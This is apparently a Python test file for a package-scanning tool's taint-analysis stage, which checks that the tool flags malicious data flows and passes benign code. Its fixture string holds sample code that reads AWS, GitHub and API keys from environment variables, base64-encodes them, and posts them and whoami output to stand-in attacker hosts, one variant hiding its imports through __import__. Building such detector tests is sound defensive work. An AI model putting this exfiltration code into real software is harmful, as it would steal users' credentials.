"""Taint Slicing 단위 + 파이프라인 통합 테스트."""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pkgsentinel.stages.taint_slicer import (
    analyze_python,
    slice_for_llm,
)

# 실제 악성 패턴 - credential theft + reverse shell
MALICIOUS_SAMPLE = '''
import os
import base64
import requests
import subprocess


def collect_and_send():
    aws_key = os.environ.get("AWS_ACCESS_KEY_ID")
    github = os.environ.get("GITHUB_TOKEN")
    encoded = base64.b64encode((aws_key + ":" + github).encode())
    requests.post(
        "https://attacker.example.com/c2",
        data=encoded,
        verify=False,
    )


def remote_exec():
    out = subprocess.check_output(["whoami"])
    requests.put("https://x.example.com/upload", data=out)


def via_obfuscation():
    secret = __import__("os").environ.get("API_KEY")
    payload = base64.b64encode(secret.encode())
    __import__("requests").post("https://evil.example.com", data=payload)
'''

# 정상 코드 - taint flow 없어야 함
BENIGN_SAMPLE = '''
import json
import requests


def fetch_data(url):
    resp = requests.get(url)
    return json.loads(resp.text)


def main():
    data = fetch_data("https://api.example.com/items")
    print(data)
'''


def test_malicious():
    rpt = analyze_python(MALICIOUS_SAMPLE)
    print(f"[MALICIOUS] flows: {len(rpt.flows)}")
    for f in rpt.flows:
        print(f"  - {f.to_summary()}")
        print(f"    var={f.tainted_var}, source@L{f.source_line}, sink@L{f.sink_line}")
        if f.transforms:
            print(f"    transforms={f.transforms}")

    expected_min = 2  # 최소 두 가지 흐름은 잡혀야 함
    if len(rpt.flows) >= expected_min:
        print(f"  OK (>= {expected_min} flows)")
    else:
        print(f"  FAIL (expected >= {expected_min}, got {len(rpt.flows)})")
        return False
    return True


def test_benign():
    rpt = analyze_python(BENIGN_SAMPLE)
    print(f"\n[BENIGN] flows: {len(rpt.flows)}")
    if not rpt.flows:
        print("  OK - taint flow 없음")
        return True
    for f in rpt.flows:
        print(f"  FAIL: unexpected flow {f.to_summary()}")
    return False


def test_slice_format():
    rpt = analyze_python(MALICIOUS_SAMPLE)
    sliced = slice_for_llm(MALICIOUS_SAMPLE, rpt.flows)
    print(f"\n[SLICE] length: {len(sliced)} chars")
    print(sliced[:600])
    if "Flow #1" in sliced and "->" in sliced:
        print("  OK - slice 포맷 정상")
        return True
    print("  FAIL - 포맷 이상")
    return False


def main():
    ok = True
    ok &= test_malicious()
    ok &= test_benign()
    ok &= test_slice_format()
    print("\n" + ("ALL OK" if ok else "FAILED"))


if __name__ == "__main__":
    main()
